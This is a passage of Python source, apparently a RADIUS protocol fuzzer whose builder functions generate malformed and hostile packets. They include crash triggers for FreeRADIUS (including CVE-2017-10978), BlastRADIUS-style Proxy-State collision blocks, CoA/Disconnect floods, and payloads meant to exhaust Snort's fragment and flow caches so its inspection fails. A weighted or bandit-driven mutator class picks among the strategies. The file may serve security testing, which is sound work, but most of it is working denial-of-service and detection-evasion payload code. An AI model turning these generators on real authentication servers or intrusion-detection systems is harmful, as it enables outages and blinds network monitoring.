            inner = struct.pack("BB", 1, 2 + len(inner)) + inner
            if len(inner) > 250:
                break
        attrs.append(struct.pack("BBB", _ATTR_EXTENDED_3, 3 + len(inner), 1) + inner)
    elif variant == "evs_invalid_vendor":
        # Extended-Vendor-Specific (Type 241, Extended-Type 26) with bad vendor
        evs_inner = struct.pack("!I", 0xDEADBEEF) + struct.pack("BB", 1, 8) + os.urandom(6)
        attrs.append(struct.pack("BBB", _ATTR_EXTENDED_1, 3 + len(evs_inner), 26) + evs_inner)
    else:  # m_bit_on_last
        # M bit set on the very last attribute — implies more data but packet ends
        ext_type = 10
        value = os.urandom(20)
        attrs.append(struct.pack("BBBB", _ATTR_LONG_EXTENDED_2, 4 + len(value),
                                 ext_type, 0x80) + value)

    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_length_field_desync():
    """Strategy 9: Packet Length field desynchronization.

    Targets the 2-byte Length field in the RADIUS header. Variants:
    - length_too_small: Length < 20 (minimum)
    - length_too_large: Length > 4096 (maximum)
    - length_less_than_actual: Length smaller than actual packet
    - length_more_than_actual: Length larger than actual packet (padding)
    - exact_20_no_attrs: minimal valid packet (20 bytes, no attributes)
    - max_4096: exactly 4096-byte packet
    """
    variant = random.choice([
        "length_too_small", "length_too_large", "length_less_than_actual",
        "length_more_than_actual", "exact_20_no_attrs", "max_4096",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()

    if variant == "length_too_small":
        length = random.choice([0, 1, 4, 10, 19])
        attrs = _base_access_request_attrs()
        return _radius_packet_raw_length(_CODE_ACCESS_REQUEST, ident, auth, attrs, length), 1812
    elif variant == "length_too_large":
        length = random.choice([4097, 8000, 16000, 65535])
        attrs = _base_access_request_attrs()
        return _radius_packet_raw_length(_CODE_ACCESS_REQUEST, ident, auth, attrs, length), 1812
    elif variant == "length_less_than_actual":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        attrs.append(_tlv(_ATTR_REPLY_MESSAGE, b"A" * 100))
        actual = 20 + sum(len(a) for a in attrs)
        short_len = 20 + random.randint(0, actual - 25)
        return _radius_packet_raw_length(_CODE_ACCESS_REQUEST, ident, auth, attrs, short_len), 1812
    elif variant == "length_more_than_actual":
        attrs = _base_access_request_attrs()
        actual = 20 + sum(len(a) for a in attrs)
        long_len = actual + random.randint(100, 2000)
        return _radius_packet_raw_length(_CODE_ACCESS_REQUEST, ident, auth, attrs, long_len), 1812
    elif variant == "exact_20_no_attrs":
        return struct.pack("!BBH", _CODE_ACCESS_REQUEST, ident, 20) + auth, 1812
    else:  # max_4096
        attrs = _base_access_request_attrs()
        current = 20 + sum(len(a) for a in attrs)
        # Fill up to 4096
        while current < 4080:
            pad_len = min(253, 4096 - current - 2)
            if pad_len < 1:
                break
            attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(pad_len)))
            current += 2 + pad_len
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_code_confusion():
    """Strategy 10: RADIUS Code / packet type confusion.

    Variants:
    - invalid_code: Code values 0, 6-10, 14-39, 46-254
    - server_to_client: send Access-Accept/Reject/Challenge as if from client
    - code_255_reserved: reserved Code 255
    - accounting_code_on_auth_port: Accounting-Request on port 1812
    - auth_code_on_acct_port: Access-Request on port 1813
    - status_server: Status-Server (Code 12) probing
    """
    variant = random.choice([
        "invalid_code", "server_to_client", "code_255_reserved",
        "accounting_code_on_auth_port", "auth_code_on_acct_port", "status_server",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()

    if variant == "invalid_code":
        code = random.choice([0, 6, 7, 8, 9, 10, 14, 15, 20, 30, 39, 46, 50, 100, 200, 254])
        attrs = _base_access_request_attrs()
        return _radius_packet(code, ident, auth, attrs), 1812
    elif variant == "server_to_client":
        code = random.choice([_CODE_ACCESS_ACCEPT, _CODE_ACCESS_REJECT, _CODE_ACCESS_CHALLENGE])
        attrs = [_tlv(_ATTR_REPLY_MESSAGE, b"Malicious accept/reject from client")]
        return _radius_packet(code, ident, auth, attrs), 1812
    elif variant == "code_255_reserved":
        attrs = _base_access_request_attrs()
        return _radius_packet(255, ident, auth, attrs), 1812
    elif variant == "accounting_code_on_auth_port":
        auth_z = _zero_authenticator()
        attrs = _base_accounting_attrs()
        return _radius_packet(_CODE_ACCOUNTING_REQUEST, ident, auth_z, attrs), 1812
    elif variant == "auth_code_on_acct_port":
        attrs = _base_access_request_attrs()
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1813
    else:  # status_server
        attrs = [_tlv(_ATTR_MESSAGE_AUTHENTICATOR, os.urandom(16))]
        return _radius_packet(_CODE_STATUS_SERVER, ident, auth, attrs), 1812


def _build_proxy_state_injection():
    """Strategy 11: Proxy-State attribute injection (BlastRADIUS attack vector).

    Proxy-State (attr 33) is opaque and MUST be forwarded unmodified by proxies.
    BlastRADIUS uses it to inject MD5 collision blocks. Variants:
    - mass_proxy_state: many Proxy-State attributes
    - oversized_proxy_state: maximum-size (253 bytes value) Proxy-State
    - collision_block: Proxy-State containing collision-favorable byte patterns
    - duplicate_proxy_state: identical Proxy-State values
    - proxy_state_ordering: Proxy-State attrs with crafted ordering
    - empty_proxy_state: zero-length Proxy-State value
    """
    variant = random.choice([
        "mass_proxy_state", "oversized_proxy_state", "collision_block",
        "duplicate_proxy_state", "proxy_state_ordering", "empty_proxy_state",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "mass_proxy_state":
        for _ in range(random.randint(50, 200)):
            attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(random.randint(4, 50))))
    elif variant == "oversized_proxy_state":
        for _ in range(random.randint(5, 15)):
            attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(253)))
    elif variant == "collision_block":
        # Simulate MD5 collision block injection
        for _ in range(random.randint(5, 20)):
            block = hashlib.md5(os.urandom(32)).digest() * random.randint(1, 15)
            block = block[:253]
            attrs.append(_tlv(_ATTR_PROXY_STATE, block))
    elif variant == "duplicate_proxy_state":
        val = os.urandom(random.randint(16, 64))
        for _ in range(random.randint(20, 100)):
            attrs.append(_tlv(_ATTR_PROXY_STATE, val))
    elif variant == "proxy_state_ordering":
        # Specific ordering to test proxy chain handling
        for i in range(random.randint(10, 40)):
            attrs.insert(random.randint(0, len(attrs)), _tlv(_ATTR_PROXY_STATE, struct.pack("!I", i) + os.urandom(8)))
    else:  # empty_proxy_state
        for _ in range(random.randint(10, 50)):
            attrs.append(_tlv_raw(_ATTR_PROXY_STATE, 2, b""))

    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_coa_disconnect_abuse():
    """Strategy 12: CoA / Disconnect abuse (RFC 5176, port 3799).

    Variants:
    - disconnect_missing_session: Disconnect-Request without session identification
    - coa_tunnel_password: CoA-Request with Tunnel-Password (15-bit entropy weakness)
    - coa_error_cause_overflow: Error-Cause with out-of-range values
    - disconnect_flood: many Disconnect-Requests rapid fire
    - coa_service_type_authorize: Service-Type=Authorize-Only without State
    - coa_missing_attributes: CoA with required attributes missing
    """
    variant = random.choice([
        "disconnect_missing_session", "coa_tunnel_password", "coa_error_cause_overflow",
        "disconnect_flood", "coa_service_type_authorize", "coa_missing_attributes",
    ])
    ident = _rand_id()
    auth_z = _zero_authenticator()  # CoA/Disconnect use zero authenticator like accounting

    if variant == "disconnect_missing_session":
        # Missing session identification attributes
        attrs = [_tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip())]
        return _radius_packet(_CODE_DISCONNECT_REQUEST, ident, auth_z, attrs), 3799
    elif variant == "coa_tunnel_password":
        # Tunnel-Password (attr 69) in CoA — weak encryption due to zero authenticator
        # Salt = 2 bytes (first bit must be 1), then encrypted password
        salt = struct.pack("!H", random.randint(0x8000, 0xFFFF))
        # fake encrypted tunnel password
        tunnel_pwd = salt + os.urandom(random.randint(16, 48))
        attrs = [
            _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
            _tlv(_ATTR_ACCT_SESSION_ID, f"sess-{random.randint(100000, 999999)}".encode()),
            _tlv(69, tunnel_pwd),  # Tunnel-Password
        ]
        return _radius_packet(_CODE_COA_REQUEST, ident, auth_z, attrs), 3799
    elif variant == "coa_error_cause_overflow":
        # Error-Cause values outside defined range
        attrs = [
            _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
            _tlv(_ATTR_ERROR_CAUSE, struct.pack("!I", random.choice([0, 1, 999, 0xFFFFFFFF]))),
        ]
        return _radius_packet(_CODE_COA_NAK, ident, auth_z, attrs), 3799
    elif variant == "disconnect_flood":
        packets = []
        for i in range(random.randint(50, 200)):
            attrs = [
                _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
                _tlv(_ATTR_ACCT_SESSION_ID, f"sess-{random.randint(100000, 999999)}".encode()),
                _tlv(_ATTR_USER_NAME, f"user{i}@test.local".encode()),
            ]
            packets.append(_radius_packet(_CODE_DISCONNECT_REQUEST, i & 0xFF, auth_z, attrs))
        return b"".join(packets)[:_MAX_UDP], 3799
    elif variant == "coa_service_type_authorize":
        # Service-Type = Authorize-Only (17) without State attribute
        attrs = [
            _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
            _tlv(_ATTR_SERVICE_TYPE, struct.pack("!I", 17)),
            # Deliberately missing State
        ]
        return _radius_packet(_CODE_COA_REQUEST, ident, auth_z, attrs), 3799
    else:  # coa_missing_attributes
        # CoA with absolutely no useful attributes
        return _radius_packet(_CODE_COA_REQUEST, ident, auth_z, []), 3799


def _build_accounting_desync():
    """Strategy 13: Accounting protocol desynchronization.

    Targets Accounting-Request (Code 4) on port 1813. Variants:
    - invalid_status_type: Acct-Status-Type with invalid values (0, 4-6, >15)
    - missing_session_id: Acct-Session-Id absent (required)
    - huge_delay_time: Acct-Delay-Time with enormous value
    - auth_attrs_in_acct: authentication attributes in accounting packet
    - acct_attrs_in_auth: accounting attributes in auth packet
    - wrong_authenticator: non-zero authenticator (should be MD5 with zeros)
    """
    variant = random.choice([
        "invalid_status_type", "missing_session_id", "huge_delay_time",
        "auth_attrs_in_acct", "acct_attrs_in_auth", "wrong_authenticator",
    ])
    ident = _rand_id()

    if variant == "invalid_status_type":
        auth_z = _zero_authenticator()
        attrs = [
            _tlv(_ATTR_USER_NAME, b"acctuser@test.local"),
            _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
            _tlv(_ATTR_ACCT_STATUS_TYPE, struct.pack("!I", random.choice([0, 4, 5, 6, 16, 255, 0xFFFFFFFF]))),
            _tlv(_ATTR_ACCT_SESSION_ID, b"sess-12345"),
        ]
        return _radius_packet(_CODE_ACCOUNTING_REQUEST, ident, auth_z, attrs), 1813
    elif variant == "missing_session_id":
        auth_z = _zero_authenticator()
        attrs = [
            _tlv(_ATTR_USER_NAME, b"acctuser@test.local"),
            _tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()),
            _tlv(_ATTR_ACCT_STATUS_TYPE, struct.pack("!I", 1)),
            # Missing Acct-Session-Id
        ]
        return _radius_packet(_CODE_ACCOUNTING_REQUEST, ident, auth_z, attrs), 1813
    elif variant == "huge_delay_time":
        auth_z = _zero_authenticator()
        attrs = _base_accounting_attrs()
        attrs.append(_tlv(_ATTR_ACCT_DELAY_TIME, struct.pack("!I", 0xFFFFFFFF)))
        return _radius_packet(_CODE_ACCOUNTING_REQUEST, ident, auth_z, attrs), 1813
    elif variant == "auth_attrs_in_acct":
        # User-Password (forbidden in accounting)
        auth_z = _zero_authenticator()
        attrs = _base_accounting_attrs()
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        attrs.append(_tlv(_ATTR_CHAP_PASSWORD, os.urandom(17)))
        return _radius_packet(_CODE_ACCOUNTING_REQUEST, ident, auth_z, attrs), 1813
    elif variant == "acct_attrs_in_auth":
        # Accounting attributes in an Access-Request
        auth = _rand_authenticator()
        attrs = _base_access_request_attrs()
        attrs.append(_tlv(_ATTR_ACCT_STATUS_TYPE, struct.pack("!I", 1)))
        attrs.append(_tlv(_ATTR_ACCT_SESSION_TIME, struct.pack("!I", 3600)))
        attrs.append(_tlv(_ATTR_ACCT_INPUT_OCTETS, struct.pack("!I", 1000000)))
        attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
        return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812
    else:  # wrong_authenticator
        # Use random authenticator instead of MD5-with-zeros for accounting
        auth_rand = _rand_authenticator()
        attrs = _base_accounting_attrs()
        return _radius_packet(_CODE_ACCOUNTING_REQUEST, ident, auth_rand, attrs), 1813


def _build_nas_filter_rule_crash():
    """Strategy 14: NAS-Filter-Rule (attr 92) pre-auth crash.

    Targets FreeRADIUS 2026 vulnerability: long NAS-Filter-Rule crashes the
    server BEFORE shared-secret verification. Also tests Ascend-Send-Secret
    overflow (CVE-2017-10978). Variants:
    - oversized_filter_rule: NAS-Filter-Rule at max attribute length (253 bytes)
    - multiple_filter_rules: many NAS-Filter-Rule attributes
    - ascend_send_secret_overflow: Ascend-Send-Secret (attr 214) near max packet size
    - filter_rule_binary: binary data in NAS-Filter-Rule (text-type violation)
    - concat_attrs_near_max: string attributes near max packet size boundary
    - filter_rule_null_bytes: NAS-Filter-Rule with embedded NUL bytes
    """
    variant = random.choice([
        "oversized_filter_rule", "multiple_filter_rules", "ascend_send_secret_overflow",
        "filter_rule_binary", "concat_attrs_near_max", "filter_rule_null_bytes",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()

    if variant == "oversized_filter_rule":
        # Max-length NAS-Filter-Rule
        rule = b"permit in ip from any to any" + b" " * 220
        attrs.append(_tlv(_ATTR_NAS_FILTER_RULE, rule[:253]))
    elif variant == "multiple_filter_rules":
        for _ in range(random.randint(20, 60)):
            rule = f"permit in ip from 10.{random.randint(0,255)}.{random.randint(0,255)}.0/24 to any".encode()
            attrs.append(_tlv(_ATTR_NAS_FILTER_RULE, rule))
    elif variant == "ascend_send_secret_overflow":
        # CVE-2017-10978: Ascend-Send-Secret near max packet size triggers 16-byte overflow
        # Fill packet close to 4096, then add Ascend-Send-Secret (attr 214)
        while sum(len(a) for a in attrs) < 3800:
            attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(200)))
        # Add the Ascend-Send-Secret at the boundary
        remaining = 4096 - 20 - sum(len(a) for a in attrs)
        if remaining > 2:
            attrs.append(_tlv(214, os.urandom(min(remaining - 2, 253))))
    elif variant == "filter_rule_binary":
        # Binary data where text is expected
        attrs.append(_tlv(_ATTR_NAS_FILTER_RULE, os.urandom(253)))
    elif variant == "concat_attrs_near_max":
        # Many concat-eligible string attributes near packet size limit
        while sum(len(a) for a in attrs) < 3900:
            attrs.append(_tlv(_ATTR_NAS_FILTER_RULE, os.urandom(random.randint(50, 253))))
    else:  # filter_rule_null_bytes
        rule = b"permit in ip from any to any\x00\x00\x00DROP TABLE;\x00" * 5
        attrs.append(_tlv(_ATTR_NAS_FILTER_RULE, rule[:253]))

    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    return _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs), 1812


def _build_ip_frag_cache_exhaustion():
    """Strategy 15: Exhaust Snort's IP fragment reassembly cache.

    Generate RADIUS packets designed to be IP-fragmented, with structures
    that produce many incomplete or overlapping fragment chains.  Snort's
    stream_ip inspector holds fragments until timeout (60s default).
    With max_frags=8192, filling the frag cache blocks reassembly for
    ALL protocols.

    Grounding:
      - Snort 3 stream_ip.max_frags = 8,192 (default)
      - Snort 3 stream_ip.max_overlaps = 0 (unlimited!)
      - Snort 3 stream_ip.min_frag_length = 0 (no minimum check)
      - Snort 3 stream_ip.session_timeout = 60s
      - Rule 123:3 "short fragment DOS attempt" (alerts but doesn't prevent)
      - Rule 123:8 "fragmentation overlap"
      - Rule 123:12 "excessive fragment overlap"

    Variants:
    - incomplete_chains: first fragment only (no last frag → held 60s)
    - overlapping_frags: overlapping fragment offsets (max_overlaps=0)
    - tiny_fragments: 8-byte fragments (below typical MTU)
    - teardrop_variant: overlapping fragments with negative effective offset
    - mixed_ids: many different IP ID values, each incomplete
    """
    variant = random.choice([
        "incomplete_chains", "overlapping_frags", "tiny_fragments",
        "teardrop_variant", "mixed_ids",
    ])
    ident = _rand_id()
    auth = _rand_authenticator()
    attrs = _base_access_request_attrs()
    attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
    base_pkt = _radius_packet(_CODE_ACCESS_REQUEST, ident, auth, attrs)

    if variant == "incomplete_chains":
        # Many first-fragments with different simulated IP IDs
        # Each is a partial RADIUS packet (first 100 bytes) marked as "more frags"
        # Snort holds each chain for session_timeout=60s
        fragments = []
        for i in range(200):
            # Simulate a fragmented RADIUS payload by sending partial chunks
            # with a unique per-fragment marker (simulates different IP IDs)
            frag_id = struct.pack("!H", i & 0xFFFF)
            chunk = frag_id + base_pkt[:random.randint(50, 100)]
            fragments.append(chunk)
        return b"".join(fragments)[:_MAX_UDP], 1812
    elif variant == "overlapping_frags":
        # Multiple copies of the same RADIUS data at overlapping "offsets"
        # Simulates what stream_ip sees with overlapping IP fragments
        copies = []
        for offset in range(0, len(base_pkt), 8):
            # Each "fragment" overlaps the previous by 4 bytes
            start = max(0, offset - 4)
            copies.append(base_pkt[start:offset + 16])
        return b"".join(copies)[:_MAX_UDP], 1812
    elif variant == "tiny_fragments":
        # Break RADIUS packet into 8-byte "fragments" (minimum IP frag size)
        frags = []
        for i in range(0, len(base_pkt), 8):
            frags.append(base_pkt[i:i + 8])
        # Pad with additional tiny fragments to increase count
        for _ in range(500):
            frags.append(os.urandom(8))
        return b"".join(frags)[:_MAX_UDP], 1812
    elif variant == "teardrop_variant":
        # Overlapping fragments where the second fragment's offset points
        # before the end of the first — classic teardrop pattern
        frag1 = base_pkt[:40]
        # "Second fragment" starts at offset 20 (overlaps 20 bytes)
        frag2 = base_pkt[20:80]
        # Third fragment at offset 10 (overlaps everything)
        frag3 = base_pkt[10:]
        # Repeat to fill cache slots
        result = bytearray()
        for _ in range(100):
            result.extend(frag1 + frag2 + frag3)
        return bytes(result)[:_MAX_UDP], 1812
    else:  # mixed_ids
        # Many unique "flow" markers + partial data — each takes a cache slot
        result = bytearray()
        for i in range(500):
            flow_marker = struct.pack("!I", random.randint(0, 0xFFFFFFFF))
            partial = base_pkt[:random.randint(20, 60)]
            result.extend(flow_marker + partial)
        return bytes(result)[:_MAX_UDP], 1812


def _build_udp_session_spray():
    """Strategy 16: Exhaust Snort's flow cache via UDP session spray.

    Each RADIUS packet from a unique source port creates a new UDP flow
    in Snort's flow cache (keyed by 5-tuple).  By embedding per-packet
    variation that simulates different source ports/IPs, we force Snort
    to allocate many flow entries.  UDP flows timeout after 180s.

    Grounding:
      - Snort 3 stream.max_flows = 476,288
      - Snort 3 stream.udp_cache.idle_timeout = 180s
      - Snort 3 stream.prune_flows = 10 (slow eviction)
      - Each unique 5-tuple = one flow entry
      - RADIUS is UDP → no handshake overhead, cheap to spray

    Variants:
    - multi_port_spray: different RADIUS packets to ports 1812/1813/3799
    - unique_id_spray: 500 packets with unique Identifier values
    - max_attrs_spray: pad each packet with many attributes to increase cost
    - accounting_spray: Accounting-Request flood (port 1813)
    """
    variant = random.choice([
        "multi_port_spray", "unique_id_spray",
        "max_attrs_spray", "accounting_spray",
    ])

    if variant == "multi_port_spray":
        packets = []
        ports = [1812, 1813, 3799]
        for i in range(200):
            ident = i & 0xFF
            auth = _rand_authenticator()
            attrs = _base_access_request_attrs()
            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
            # Alternate between RADIUS ports
            code = [_CODE_ACCESS_REQUEST, _CODE_ACCOUNTING_REQUEST,
                    _CODE_COA_REQUEST][i % 3]
            port = ports[i % 3]
            if code == _CODE_ACCOUNTING_REQUEST:
                auth = _zero_authenticator()
            packets.append(_radius_packet(code, ident, auth, attrs))
        # Return concatenated — all go to port 1812 (transport handles routing)
        return b"".join(packets)[:_MAX_UDP], 1812
    elif variant == "unique_id_spray":
        # 500 packets, each with a unique Identifier (0-255 cycling)
        packets = []
        for i in range(500):
            auth = _rand_authenticator()
            attrs = _base_access_request_attrs()
            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
            # Vary NAS-IP-Address to simulate different source IPs
            attrs.append(_tlv(_ATTR_NAS_IP_ADDRESS, _rand_ip()))
            packets.append(_radius_packet(_CODE_ACCESS_REQUEST, i & 0xFF, auth, attrs))
        return b"".join(packets)[:_MAX_UDP], 1812
    elif variant == "max_attrs_spray":
        # Fewer packets but each is large — maximizes per-flow memory cost
        packets = []
        for i in range(50):
            auth = _rand_authenticator()
            attrs = _base_access_request_attrs()
            # Fill packet with attributes to maximize memory allocation
            while sum(len(a) for a in attrs) < 3500:
                attrs.append(_tlv(_ATTR_PROXY_STATE, os.urandom(200)))
            attrs.append(_tlv(_ATTR_USER_PASSWORD, os.urandom(16)))
            packets.append(_radius_packet(_CODE_ACCESS_REQUEST, i & 0xFF, auth, attrs))
        return b"".join(packets)[:_MAX_UDP], 1812
    else:  # accounting_spray
        # Accounting-Request flood — port 1813, zero authenticator
        packets = []
        for i in range(300):
            auth = _zero_authenticator()
            attrs = _base_accounting_attrs()
            # Unique session ID per packet → unique flow
            attrs.append(_tlv(_ATTR_ACCT_SESSION_ID,
                              f"spray-{random.randint(0, 0xFFFFFFFF):08x}".encode()))
            packets.append(_radius_packet(_CODE_ACCOUNTING_REQUEST, i & 0xFF, auth, attrs))
        return b"".join(packets)[:_MAX_UDP], 1813


# ── Dispatcher ──────────────────────────────────────────────────────────────
_BUILDERS = {
    "authenticator_manipulation":     _build_authenticator_manipulation,
    "attribute_tlv_overflow":         _build_attribute_tlv_overflow,
    "user_password_encryption_abuse": _build_user_password_encryption_abuse,
    "vendor_specific_overflow":       _build_vendor_specific_overflow,
    "wimax_continuation_attack":      _build_wimax_continuation_attack,
    "eap_message_fragmentation":      _build_eap_message_fragmentation,
    "message_authenticator_malform":  _build_message_authenticator_malform,
    "extended_attribute_abuse":       _build_extended_attribute_abuse,
    "length_field_desync":            _build_length_field_desync,
    "code_confusion":                 _build_code_confusion,
    "proxy_state_injection":          _build_proxy_state_injection,
    "coa_disconnect_abuse":           _build_coa_disconnect_abuse,
    "accounting_desync":              _build_accounting_desync,
    "nas_filter_rule_crash":          _build_nas_filter_rule_crash,
    "ip_frag_cache_exhaustion":       _build_ip_frag_cache_exhaustion,
    "udp_session_spray":              _build_udp_session_spray,
}


_RADIUS_OVERRIDE_CAPABLE = frozenset(["user_password_encryption_abuse"])

def build_radius_payload(strategy: str, payload_override=None):
    """Return (payload_bytes, dst_port) for the given strategy."""
    builder = _BUILDERS.get(strategy)
    if builder is None:
        builder = _build_authenticator_manipulation
    if payload_override is not None and strategy in _RADIUS_OVERRIDE_CAPABLE:
        payload, dst_port = builder(payload_override=payload_override)
    else:
        payload, dst_port = builder()
    return _clamp(payload), dst_port



# ── Mutator class ──────────────────────────────────────────────────────────
class RadiusMutator:
    def __init__(self, external_weights=None, bandit=None):
        self.strategies = RADIUS_STRATEGIES
        self._external_weights = external_weights
        self._bandit = bandit

    @property
    def weights(self):
        if self._external_weights:
            return [self._external_weights.get(s, 5) for s in self.strategies]
        return RADIUS_WEIGHTS

    def mutate(self, payload_override=None):
        """Returns (payload_bytes, strategy_name, dst_port)."""
        if self._bandit:
            strategy = self._bandit.select_with_weights(self._external_weights or {})
        else:
            strategy = random.choices(self.strategies, weights=self.weights, k=1)[0]
        payload, dst_port = build_radius_payload(strategy, payload_override=payload_override)
        return payload, strategy, dst_port
